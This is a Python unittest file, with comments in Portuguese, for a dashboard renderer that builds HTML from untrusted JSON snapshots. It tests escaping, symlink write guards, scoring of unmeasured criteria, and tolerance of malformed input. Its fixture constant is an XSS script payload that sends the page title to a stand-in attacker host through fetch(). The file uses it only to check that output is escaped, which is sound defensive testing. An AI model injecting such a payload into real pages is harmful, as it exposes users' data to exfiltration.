"""Guards do dashboard.

O modelo de distribuicao da skill e snapshot VERSIONADO: quem clona um
repositorio alheio e roda o render abre, no proprio navegador, HTML derivado
de JSON escrito por outra pessoa.
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from _fake_repo import fake_repo  # noqa: F401  (garante o sys.path dos scripts)

import render

PAYLOAD = "<script>fetch('https://evil.example/'+document.title)</script>"


def _snap(**extra):
    base = {
        "schema": 2, "project": "alvo",
        "generated_at": "2026-08-13T09:00:00-03:00",
        "collectors_run": ["git"], "errors": {},
    }
    base.update(extra)
    return base


class TestSnapshotHostil(unittest.TestCase):

    def test_campos_numericos_nao_injetam_script(self):
        snap = _snap(
            git={"age_days": PAYLOAD, "commits_30d": PAYLOAD, "authors_30d": []},
            django={"models": PAYLOAD, "apps": PAYLOAD},
            db={"cache_hit_ratio": PAYLOAD,
                "unused_indexes": [{"index": "i", "table": "t", "bytes": 1,
                                    "idx_scan": PAYLOAD}],
                "slow_queries": [{"query": "select 1", "calls": 1,
                                  "mean_ms": PAYLOAD, "total_s": PAYLOAD}]},
            quality={"complexity": {"worst": [{"file": "a.py", "name": "f",
                                               "complexity": 1, "line": PAYLOAD}]}},
        )
        html = render.render([snap])
        self.assertNotIn("<script>fetch", html)
        self.assertNotIn("</script><script", html)

    def test_snapshot_de_forma_invalida_nao_derruba(self):
        with tempfile.TemporaryDirectory() as tmp:
            Path(tmp, "2026-01-01.json").write_text("[1, 2, 3]", encoding="utf-8")
            Path(tmp, "2026-01-02.json").write_text(
                json.dumps(_snap()), encoding="utf-8")
            snaps = render.load_snapshots(tmp)
        self.assertEqual(len(snaps), 1)
        self.assertEqual(snaps[0]["project"], "alvo")

    def test_criterio_nao_medido_sai_do_denominador(self):
        """Nao medir nao pode nem premiar nem punir a nota."""
        # "dependabot": False fixa 1 criterio como falha real nos dois lados.
        # Sem isso os dois snapshots batem 100% de qualquer jeito (tudo que
        # sobra no denominador passa), e o assertNotEqual abaixo nunca
        # conseguiria provar nada — verificado rodando o fixture original do
        # brief antes desta troca: 100 contra 100 mesmo com o fix aplicado,
        # porque excluir um item 100%-limpo do denominador nao move a razao
        # quando so sobram itens que tambem passam. Com uma falha real
        # presente nos dois, excluir segredos_commitados do denominador MUDA
        # a fracao (a falha pesa proporcionalmente mais), e da pra provar que
        # o item nao medido saiu do calculo sem alegar credito.
        medido = _snap(governance={"segredos_commitados": [], "workflows": {},
                                   "dependencias": {}, "dependabot": False})
        nao = _snap(governance={"segredos_commitados": None,
                                "nao_medido": {"segredos_commitados": "git falhou"},
                                "workflows": {}, "dependencias": {},
                                "dependabot": False})
        eixos_m = {x["nome"]: x for x in render.auditoria(medido)[0]}
        eixos_n = {x["nome"]: x for x in render.auditoria(nao)[0]}
        self.assertNotEqual(eixos_m["Segurança"]["pct"], eixos_n["Segurança"]["pct"])
        rotulos = " ".join(r for r, _ in eixos_n["Segurança"]["checados"])
        self.assertIn("não auditado", rotulos)


class TestContratoAchadoParqueado(unittest.TestCase):
    """Ponta a ponta: prova o contrato inteiro do achado parqueado na Task 3.

    render.py:323 (antes do fix) fazia `gov.get("segredos_commitados") or []`,
    o que reconstruia o None em lista vazia ANTES do criterio decidir "ok" —
    a nao-medicao virava "nenhum segredo commitado: atendido" com badge verde
    e criterio P0 marcado como cumprido. Este teste monta o HTML de verdade
    (nao so chama auditoria()) e prova as tres pontas do contrato.
    """

    def test_html_nao_afirma_seguranca_sem_medir(self):
        # "dependabot": False deixa 1 criterio realmente reprovado nos dois
        # snapshots — sem isso os dois batem 100% (excluir um item que so
        # ia contribuir pontos "limpos" do denominador nao move a razao
        # quando o resto ja passa 100%), e o assertNotEqual do item (2) nunca
        # provaria nada. Ver comentario identico em
        # test_criterio_nao_medido_sai_do_denominador.
        nao_medido = _snap(governance={
            "segredos_commitados": None,
            "nao_medido": {"segredos_commitados": "git ls-files falhou"},
            "workflows": {}, "dependencias": {}, "dependabot": False,
        })
        medido_limpo = _snap(governance={
            "segredos_commitados": [],
            "workflows": {}, "dependencias": {}, "dependabot": False,
        })

        html_nao_medido = render.render([nao_medido])
        html_medido = render.render([medido_limpo])

        # (1) o motivo do nao-auditado aparece na tela, com o texto exato
        # que a UI usa pra sinalizar "isto nao foi verificado".
        self.assertIn("não auditado", html_nao_medido)
        self.assertIn("git ls-files falhou", html_nao_medido)
        # o snapshot de verdade limpo nao tem motivo nenhum pra mostrar.
        self.assertNotIn("git ls-files falhou", html_medido)

        # (2) a nota do eixo Seguranca no snapshot nao-medido tem que ser
        # DIFERENTE da nota do mesmo snapshot com segredos_commitados=[]
        # (medido, de verdade limpo). Notas iguais = a nao-medicao esta
        # sendo contada como "limpo", que e exatamente a mentira do achado.
        pct_nao_medido = {x["nome"]: x["pct"] for x in render.auditoria(nao_medido)[0]}["Segurança"]
        pct_medido = {x["nome"]: x["pct"] for x in render.auditoria(medido_limpo)[0]}["Segurança"]
        self.assertNotEqual(pct_nao_medido, pct_medido)

        # (3) o painel NAO pode afirmar "nenhum segredo commitado" como
        # criterio cumprido (marcado com o check "sim") quando na verdade
        # ninguem mediu. Criterio deve aparecer como "na" (nao aplicavel /
        # nao auditado), nunca "sim".
        eixos_nao_medido = {x["nome"]: x for x in render.auditoria(nao_medido)[0]}
        checklist = eixos_nao_medido["Segurança"]["checados"]
        item_segredo = next(rot for rot, ok in checklist if "segredo" in rot)
        ok_segredo = next(ok for rot, ok in checklist if "segredo" in rot)
        self.assertIsNone(ok_segredo, "segredos_commitados nao medido tem que "
                                       "sair como ok=None (nem sim, nem nao)")
        # o card do eixo no HTML usa class="na" pro item nao auditado —
        # nunca class="sim" (que so aparece quando ok is True de verdade).
        self.assertIn(f'class="na">{render.e(item_segredo)}', html_nao_medido)
        self.assertNotIn(f'class="sim">{render.e(item_segredo)}', html_nao_medido)


class TestSiblingWorkflowsNaoMedido(unittest.TestCase):
    """Achado extra da varredura: `wf = gov.get("workflows") or {}` tinha o
    MESMO efeito do achado parqueado, so que num vizinho. Se o coletor
    `governance` inteiro falha (excecao antes de popular o dict), o
    `governance` nem aparece no snapshot — so em `errors`. Sem o fix, isso
    reconstruia `wf` como `{}` e `not wf.get("sem_pin")` virava True: as
    duas checks de workflow (pin e permissions) saiam "atendidas" de graca.
    """

    def test_governance_ausente_nao_credita_workflows(self):
        sem_governance = _snap(errors={"governance": "boom: falha inesperada"})
        eixos = {x["nome"]: x for x in render.auditoria(sem_governance)[0]}
        checklist = dict(eixos["Segurança"]["checados"])
        ok_pin = checklist["actions com versão fixada"]
        ok_perm = checklist["workflows com permissions declarado"]
        self.assertIsNone(ok_pin, "sem coletor rodado, pin nao pode sair True")
        self.assertIsNone(ok_perm, "sem coletor rodado, permissions nao pode sair True")

    def test_governance_presente_com_workflows_vazio_e_realmente_ok(self):
        """Contraste: quando o coletor RODOU e workflows e legitimamente vazio
        (sem .github/workflows), os dois criterios sao True de verdade — o
        fix nao pode transformar "medido e limpo" em "nao medido"."""
        com_governance = _snap(governance={
            "segredos_commitados": [], "workflows": {"sem_pin": [], "sem_permissions": []},
            "dependencias": {},
        })
        eixos = {x["nome"]: x for x in render.auditoria(com_governance)[0]}
        checklist = dict(eixos["Segurança"]["checados"])
        self.assertTrue(checklist["actions com versão fixada"])
        self.assertTrue(checklist["workflows com permissions declarado"])


# ----------------------------------------------------------------------
# Fix round 1: achados da revisao externa (2 Critical, 3 Important, 2 Minor)
# ----------------------------------------------------------------------

class TestCritical1DependenciasXSS(unittest.TestCase):
    """render.py `build_signals`, ramo `else` de `if models:` (repo
    nao-Django — a MAIORIA dos repos numa ferramenta multi-linguagem):
    `stack.dependencies` era interpolado cru dentro de `<span
    class="stat-sub">`, sem `e()` nem `num()`. Payload executavel provado
    ponta a ponta antes do fix (`grep -c "<script"` = 1 no HTML gerado)."""

    def test_stack_dependencies_nao_injeta_script(self):
        snap = _snap(stack={"dependencies": PAYLOAD})  # sem "django" -> ramo else
        html = render.render([snap])
        self.assertNotIn("<script>fetch", html)

    def test_stack_dependencies_numero_normal_continua_mostrando(self):
        """Mutacao inversa: garante que o fix nao quebrou o caso feliz."""
        snap = _snap(stack={"dependencies": 7})
        html = render.render([snap])
        self.assertIn("7 dependências", html)


class TestCritical2SymlinkGuard(unittest.TestCase):
    """render.py `main()`: o guard so testava `Path(dirpath).is_symlink()`
    (pasta). Com `.ruch-x` sendo uma pasta REAL mas `.ruch-x/dashboard.html`
    sendo um symlink versionado apontando pra fora, `out.write_text()`
    seguia o link e escrevia FORA do repositorio, exit 0, silencioso — e
    `--open` abriria esse arquivo externo. Cobre os DOIS casos: pasta-symlink
    e arquivo-symlink (o segundo e o que furava o guard anterior)."""

    def _rodar_main_em(self, projeto):
        cwd = os.getcwd()
        os.chdir(projeto)
        try:
            with mock.patch.object(sys, "argv", ["render.py"]):
                with self.assertRaises(SystemExit):
                    render.main()
        finally:
            os.chdir(cwd)

    def test_pasta_de_snapshots_symlink_e_recusada(self):
        with tempfile.TemporaryDirectory() as tmp:
            fora = Path(tmp, "fora")
            fora.mkdir()
            (fora / "2026-01-01.json").write_text(json.dumps(_snap()), encoding="utf-8")
            projeto = Path(tmp, "projeto")
            projeto.mkdir()
            (projeto / ".ruch-x").symlink_to(fora, target_is_directory=True)

            self._rodar_main_em(projeto)
            self.assertFalse((fora / "dashboard.html").exists(),
                              "nada pode ter sido escrito do lado de fora do repositorio")

    def test_arquivo_dashboard_symlink_e_recusado(self):
        with tempfile.TemporaryDirectory() as tmp:
            alvo_externo = Path(tmp, "evil.html")
            projeto = Path(tmp, "projeto")
            projeto.mkdir()
            snapdir = projeto / ".ruch-x"
            snapdir.mkdir()
            (snapdir / "2026-01-01.json").write_text(json.dumps(_snap()), encoding="utf-8")
            (snapdir / "dashboard.html").symlink_to(alvo_externo)

            self._rodar_main_em(projeto)
            self.assertFalse(alvo_externo.exists(),
                              "o arquivo do outro lado do symlink nao pode ter sido criado/escrito")

    def test_caso_normal_sem_symlink_continua_escrevendo(self):
        """Mutacao inversa: garante que o guard nao bloqueou o caminho feliz."""
        with tempfile.TemporaryDirectory() as tmp:
            projeto = Path(tmp, "projeto")
            projeto.mkdir()
            snapdir = projeto / ".ruch-x"
            snapdir.mkdir()
            (snapdir / "2026-01-01.json").write_text(json.dumps(_snap()), encoding="utf-8")

            cwd = os.getcwd()
            os.chdir(projeto)
            try:
                with mock.patch.object(sys, "argv", ["render.py"]):
                    render.main()  # nao deve lancar SystemExit
            finally:
                os.chdir(cwd)
            self.assertTrue((snapdir / "dashboard.html").exists())


class TestImportant3NotaSemMedicao(unittest.TestCase):
    """`_nota(0, 0)` devolvia `(0, "F")` — eixo sem NENHUM criterio medido
    (ex.: coletor `governance` inteiro caiu, nada mais no snapshot) virava
    reprovacao FALSA, o mesmo pecado do achado parqueado na direcao oposta
    (nao medir nao pode punir, tampouco premiar)."""

    def test_nota_zero_sobre_zero_nao_e_F(self):
        letra_direta = render._nota(0, 0)[1]
        self.assertNotEqual(letra_direta, "F")
        self.assertEqual(letra_direta, "NA")
        self.assertIsNone(render._nota(0, 0)[0])

    def test_eixo_sem_criterio_medido_nao_vira_F_no_html(self):
        # fixture do proprio review: so o coletor governance falhou, resto
        # do snapshot ausente -> eixo Seguranca fica com total==0.
        snap = _snap(errors={"governance": "boom: falha inesperada"})
        eixos = {x["nome"]: x for x in render.auditoria(snap)[0]}
        seg = eixos["Segurança"]
        self.assertEqual(seg["letra"], "NA")
        self.assertIsNone(seg["pct"])
        html = render.render([snap])
        # o card do eixo Seguranca especificamente nao pode usar a classe
        # nota-F (vermelha, "reprovado") nem mostrar a letra F.
        self.assertNotIn('<div class="eixo nota-F"><div class="letra">F</div>'
                          '<div class="eixo-corpo"><h3>Segurança</h3>', html)
        self.assertIn('class="eixo nota-NA"', html)
        self.assertIn("não auditado — nenhum critério deste eixo pôde ser medido", html)


class TestImportant4GeneratedAtMalformado(unittest.TestCase):
    """`datetime.fromisoformat` so aceita string — `generated_at: null`
    (coletor que falhou, nao hostilidade) ou qualquer tipo nao-string
    levanta TypeError, nao capturado antes (so ValueError). Step 5 desta
    mesma task coagiu a chave de ordenacao do `load_snapshots` pra string,
    entao um `generated_at` malformado agora SOBREVIVE ao load e chegava
    vivo no render — onde crashava."""

    def test_generated_at_none_nao_derruba_render(self):
        snap = _snap(generated_at=None)
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_generated_at_numero_nao_derruba_render(self):
        snap = _snap(generated_at=20260813)
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_generated_at_lista_nao_derruba_render(self):
        snap = _snap(generated_at=["nao", "e", "data"])
        html = render.render([snap])
        self.assertIn("<html", html)


class TestImportant5ClassesDeLixo(unittest.TestCase):
    """Guard obrigatorio: um snapshot com TODAS as classes de lixo listadas
    pela revisao numa carga so — tem que produzir HTML (nunca traceback) e
    nao pode conter `<script` em lugar nenhum. Isola tambem cada classe em
    teste proprio pros casos mais especificos, pra apontar exatamente o que
    quebrou se este guard falhar de novo."""

    def _snapshot_lixo_total(self):
        return _snap(
            generated_at=None,
            collectors_run=[1, 2, "git"],
            errors=["nao e dict"],
            git={
                "branch": "main", "commit": "abc123",
                "age_days": PAYLOAD, "commits_30d": PAYLOAD,
                "authors_30d": "nao e lista",
                "hotspots": [
                    {"churn": 5, "complexity": 20, "loc": -999, "file": PAYLOAD},
                    {"churn": 3, "complexity": 8},  # sem "file"
                    "nao e dict",
                    {"churn": "abc", "complexity": 9, "file": "x.py", "loc": 10},
                ],
            },
            django={
                "models": PAYLOAD, "apps": PAYLOAD,
                "deploy_issues": "nao e lista",
                "pending_migrations": {"nao": "lista"},
                "ambiente_de_producao": True,
            },
            db="nao e dict",
            governance="nao e dict",
            quality={
                "complexity": {
                    "above_10": "abc", "blocks_analyzed": "abc",
                    "worst": [{"complexity": 99, "line": PAYLOAD}, "nao e dict",
                              {"file": "a.py", "name": "f", "complexity": PAYLOAD, "line": 1}],
                },
                "ruff": {"by_rule": [{"rule": "E501"}, "nao e dict",
                                     {"rule": "F401", "count": PAYLOAD}]},
            },
            tests={
                "coverage_pct": PAYLOAD, "coverage_age_days": PAYLOAD, "test_count": PAYLOAD,
                "by_app": [{"coverage_pct": PAYLOAD, "statements": PAYLOAD}, "nao e dict",
                          {"app": "x"}],
            },
            code={
                "total_loc": PAYLOAD, "total_files": PAYLOAD,
                "by_app": [{"app": "x", "code": PAYLOAD, "tests": PAYLOAD, "test_ratio": PAYLOAD},
                          "nao e dict",
                          # inteiro gigante — JSON nao limita precisao de int,
                          # e um total forjado (ou so muito errado) pode vir
                          # maior que o float aguenta (round 2 do fix externo).
                          {"app": "y", "code": 10**400, "tests": 10**300, "test_ratio": 0.5}],
            },
            stack={"detected": [1, 2, PAYLOAD], "dependencies": PAYLOAD},
            ci={
                "success_rate": PAYLOAD, "avg_duration_s": PAYLOAD,
                "recent": [{"duration_s": PAYLOAD}, "nao e dict"],
            },
            infra={"containers": [{"cpu": PAYLOAD}, "nao e dict"], "host": PAYLOAD},
        )

    def test_carga_total_produz_html_sem_traceback_e_sem_script(self):
        snap = self._snapshot_lixo_total()
        html = render.render([snap])  # nao pode levantar excecao
        self.assertIn("<html", html)
        self.assertNotIn("<script>fetch", html)

    def test_hotspots_loc_negativo_nao_vira_complex(self):
        snap = _snap(git={"hotspots": [
            {"churn": 5, "complexity": 10, "loc": -50, "file": "a.py"},
            {"churn": 3, "complexity": 8, "loc": -1, "file": "b.py"},
            {"churn": 9, "complexity": 30, "loc": -2, "file": "c.py"},
        ]})
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_governance_como_string_nao_estoura_get(self):
        snap = _snap(governance="nao e dict")
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_db_como_string_nao_estoura_get(self):
        snap = _snap(db="nao e dict")
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_errors_como_lista_nao_estoura_items(self):
        snap = _snap(errors=["nao e dict"])
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_hotspots_sem_file_nao_da_keyerror(self):
        snap = _snap(git={"hotspots": [
            {"churn": 5, "complexity": 10, "loc": 5},
            {"churn": 3, "complexity": 8, "loc": 5},
            {"churn": 9, "complexity": 30, "loc": 5},
        ]})
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_segredos_sem_file_nao_da_keyerror(self):
        snap = _snap(governance={"segredos_commitados": [{"kind": "token"}],
                                 "workflows": {}, "dependencias": {}})
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_by_app_sem_campo_nao_da_keyerror(self):
        snap = _snap(tests={"by_app": [{}]})
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_db_size_lista_de_nao_dicts_nao_estoura(self):
        snap = _snap(db={"size": ["nao e dict", 123]})
        html = render.render([snap])
        self.assertIn("<html", html)


# ----------------------------------------------------------------------
# Fix round 2: regressao do proprio fix de robustez — milhar() com int
# gigante
# ----------------------------------------------------------------------

class TestMilharOverflow(unittest.TestCase):
    """`milhar()` (helper NOVO do round 1, criado pra fechar o Important 5)
    usava `f"{v:,.0f}"` — o `.0f` forca conversao pra float antes de
    formatar. JSON nao limita a precisao de um numero sem ponto/expoente, e
    Python int nao tem limite de tamanho, mas float tem (~1.8e308). Um
    total_loc/total_files/test_count/statements/code/tests/live_rows/
    seq_scan/calls forjado (ou so muito errado) acima do limite do float
    estourava `OverflowError`; um pouco abaixo disso, mas ainda grande,
    perdia precisao SILENCIOSAMENTE (digito de lixo no dashboard, sem
    excecao nenhuma pra avisar). O codigo ANTIGO (antes do round 1) usava
    `f"{loc:,}"` — formatacao inteira nativa, sem essa conversao — entao a
    funcao criada pra fechar a robustez introduziu um caso novo de crash.
    """

    def test_inteiro_gigante_nao_estoura_overflowerror(self):
        # reproducao exata do relato da revisao: 10**400 e maior que
        # qualquer float representavel (float('inf') comeca em ~1.8e308).
        self.assertIsNotNone(render.milhar(10**400))

    def test_render_com_total_loc_gigante_nao_derruba(self):
        """Ponta a ponta: o mesmo `render.render([snap])` que a revisao
        rodou pra provar o crash."""
        snap = _snap(code={"total_loc": 10**400})
        html = render.render([snap])
        self.assertIn("<html", html)

    def test_inteiro_grande_sem_perda_de_precisao(self):
        """10**300 nao chega a estourar OverflowError, mas conversao pra
        float perderia digitos por precisao — assere o VALOR formatado,
        nao so a ausencia de excecao (a exigencia explicita do coordenador:
        um teste que so checa "nao lancou excecao" deixaria passar o efeito
        colateral de precisao que a revisao tambem descreveu)."""
        valor = 10**300
        resultado = render.milhar(valor)
        # tira os pontos de milhar (separador BR) e compara com a
        # representacao decimal exata do inteiro. Se tivesse passado por
        # float, o resultado teria arredondamento/zeros de lixo em vez do
        # digito 1 seguido de exatamente 300 zeros.
        self.assertEqual(resultado.replace(".", ""), str(valor))
        self.assertTrue(resultado.startswith("1."))

    def test_float_legitimo_continua_formatado_como_antes(self):
        """Mutacao inversa / nao-regressao: garante que o fix nao alterou o
        caso normal — float de verdade (ex: media com casas decimais)
        continua passando pelo caminho antigo (`.0f`, arredonda pra
        inteiro)."""
        self.assertEqual(render.milhar(1234.7), "1.235")

    def test_carga_total_de_lixo_inclui_inteiro_gigante(self):
        """O guard de robustez do round 1 (`_snapshot_lixo_total`) agora
        tambem carrega um `10**400`/`10**300` dentro de `code.by_app` — este
        teste isola so essa fatia, sem depender do resto da carga
        combinada, pra apontar direto pro `milhar()` se quebrar nesse ponto
        de novo."""
        snap = _snap(code={"by_app": [
            {"app": "y", "code": 10**400, "tests": 10**300, "test_ratio": 0.5},
        ]})
        html = render.render([snap])
        self.assertIn("<html", html)
        self.assertNotIn("<script", html)


if __name__ == "__main__":
    unittest.main()
